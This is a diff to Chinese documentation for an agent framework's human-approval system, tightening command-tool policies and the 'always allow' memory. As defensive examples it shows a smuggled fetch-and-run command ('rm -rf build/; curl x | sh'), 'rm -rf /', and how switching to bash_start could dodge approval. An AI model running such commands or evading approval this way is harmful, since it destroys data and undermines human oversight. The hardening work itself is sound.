@@ -125,15 +125,14 @@ HarnessEngine engine = HarnessEngine.of("/workspace", ".solon")
     .build();
 ```
 
-启用后，HarnessEngine 会自动注册以下策略到 HITLInterceptor：
+启用后，HarnessEngine 缺省只给命令执行类工具注册策略（`HarnessEngine#initHitlDefault`）：
 
 | 工具 | 策略 | 说明 |
 |------|------|------|
 | `bash` | `BashToolStrategy` | P0 硬编码防御 + 只读命令白名单 + PermissionEngine |
-| `write` | `WriteToolStrategy` | 路径回溯防御 + PermissionEngine |
-| `edit` | `WriteToolStrategy` | 路径回溯防御 + PermissionEngine |
-| `webfetch` | `WebToolStrategy` | 域名黑名单 + PermissionEngine |
-| `websearch` | `WebToolStrategy` | 域名黑名单 + PermissionEngine |
+| `bash_start` | `BashToolStrategy`（与 `bash` 同一实例） | 执行的是同一种命令，必须同一策略，否则换用 `bash_start` 就能绕过审批；`bash_wait` / `bash_stop` 只作用于已审过的会话，不单独审批 |
+
+`WriteToolStrategy`（write / edit）与 `WebToolStrategy`（webfetch / websearch）是现成策略，但缺省**不注册**；需要时经 `getHitlInterceptor().onTool(...)` 自行挂上，或用 `Builder.hitlInterceptor(...)` 换成自己的拦截器（§12、§14）。
 
 ### 2.2 在 ReActAgent 中独立使用
 
@@ -826,19 +825,20 @@ engine.setHitlEnabled(true);
 
 ## 13. alwaysAllow 始终允许机制
 
-当用户通过 `HITL.approve(session, task, true)` 批准并标记 `alwaysAllow = true` 时，系统会自动向 `PermissionContext` 注入一条会话级规则，使后续同类操作自动放行。
+当用户通过 `HITL.approve(session, task, true)` 批准并标记 `alwaysAllow = true` 时，HarnessEngine 缺省的 `onApproved` 回调会给**本会话**记一条放行规则（`RememberedApprovals`，每会话上限 100 条），之后本会话里**一模一样**的调用自动放行。它不写进引擎级 `PermissionContext`：同引擎的其它会话、其它用户照常审批。
 
 ### 13.1 注入逻辑
 
-HarnessEngine 默认注册的 `onApproved` 回调会从工具参数中提取模式：
+回调按 `command` → `file_path` 的顺序取参数，生成逐字匹配的规则 `PermissionRule.allowExact(tool, key, value)`（不用 glob：原文里的 `*` 若当通配符，批准 `rm -rf build/*` 会连带放行 `rm -rf build/; curl x | sh`）：
 
-| 工具 | 提取字段 | 注入规则示例 |
-|------|----------|-------------|
-| `bash` | `command` | `PermissionRule.allow("bash", "git push origin main")` |
-| `write` | `file_path` | `PermissionRule.allow("write", "src/Main.java")` |
-| `edit` | `file_path` | `PermissionRule.allow("edit", "src/Main.java")` |
-| `webfetch` | `url` | `PermissionRule.allow("webfetch", "https://api.example.com/*")` |
-| 其他 | 无 | `PermissionRule.allow(toolName)`（工具级放行） |
+| 工具 | 提取字段 | 记住的规则 |
+|------|----------|-----------|
+| `bash` | `command` | `PermissionRule.allowExact("bash", "command", "git push origin main")` |
+| `bash_start` | `command` | 记成 `bash` 的规则（同一条命令两个工具都放行） |
+| `write` / `edit` 等带 `file_path` 的工具 | `file_path` | `PermissionRule.allowExact("write", "file_path", "src/Main.java")` |
+| 其他（取不到 `command` / `file_path`，如 `webfetch`） | 无 | **不记忆**，下次照常审批（绝不退化为整工具放行） |
+
+没有会话（`trace` 拿不到会话）时也不记忆。
 
 ### 13.2 细粒度放行
 
@@ -846,9 +846,9 @@ HarnessEngine 默认注册的 `onApproved` 回调会从工具参数中提取模�
 // 用户批准了 bash: git push origin main
 HITL.approve(session, task, true);
 
-// 注入规则：PermissionRule.allow("bash", "git push origin main")
-// 后续 "git push origin main" 自动放行
-// 但 "rm -rf /" 仍会触发人工确认
+// 本会话记住：PermissionRule.allowExact("bash", "command", "git push origin main")
+// 后续本会话里 "git push origin main" 自动放行
+// "git push origin dev"、"rm -rf /" 仍会触发人工确认；其它会话也照常审批
 ```
 
 ### 13.3 自定义 onApproved 回调
@@ -856,15 +856,17 @@ HITL.approve(session, task, true);
 ```java
 HITLInterceptor interceptor = new HITLInterceptor()
     .onTool("transfer", strategy)
-    .onApproved((toolName, args) -> {
-        // 自定义规则注入逻辑
-        String pattern = (String) args.get("command");
-        if (pattern != null) {
-            engine.addPermissionRule(
-                PermissionRule.allow(toolName, pattern));
+    .onApproved((HITLInterceptor.ApprovedHandler) (trace, toolName, args) -> {
+        // 自定义记忆逻辑：只记到本会话、逐字匹配（与缺省行为同口径）
+        Object to = args.get("to");
+        if (to instanceof String && trace != null) {
+            RememberedApprovals.remember(trace.getSession(),
+                PermissionRule.allowExact(toolName, "to", (String) to));
         }
     });
 ```
+
+两参的 `onApproved(BiConsumer<String, Map>)` 已弃用（拿不到会话）。记忆规则只对读取 `RememberedApprovals.merge(...)` 的策略生效（内置三种策略都会读）；不要在这里调 `engine.addPermissionRule(...)`，那是引擎级规则，会把一个人的「总是允许」放大到所有会话。
 
 ---
 
@@ -956,7 +958,7 @@ public class AgentController {
     @Post
     @Mapping("/chat")
     public String chat(@Body ChatRequest req) {
-        AgentSession session = sessionProvider.getSession(req.getSessionId(), true);
+        AgentSession session = sessionProvider.getSession(req.getSessionId(), null, true);
         ReActResponse resp = engine.prompt(req.getMessage())
             .session(session)
             .call();
@@ -982,7 +984,7 @@ public class AgentController {
     @Post
     @Mapping("/approve")
     public String approve(@Body ApproveRequest req) {
-        AgentSession session = sessionProvider.getSession(req.getSessionId(), true);
+        AgentSession session = sessionProvider.getSession(req.getSessionId(), null, true);
         HITLTask task = HITL.getPendingTask(session);
 
         if (task == null) {
@@ -1024,7 +1026,7 @@ public class AgentController {
     @Post
     @Mapping("/reject")
     public String reject(@Body RejectRequest req) {
-        AgentSession session = sessionProvider.getSession(req.getSessionId(), true);
+        AgentSession session = sessionProvider.getSession(req.getSessionId(), null, true);
         HITLTask task = HITL.getPendingTask(session);
 
         if (task == null) {
@@ -1047,7 +1049,7 @@ public class AgentController {
     @Post
     @Mapping("/skip")
     public String skip(@Body SkipRequest req) {
-        AgentSession session = sessionProvider.getSession(req.getSessionId(), true);
+        AgentSession session = sessionProvider.getSession(req.getSessionId(), null, true);
         HITLTask task = HITL.getPendingTask(session);
 
         if (task == null) {
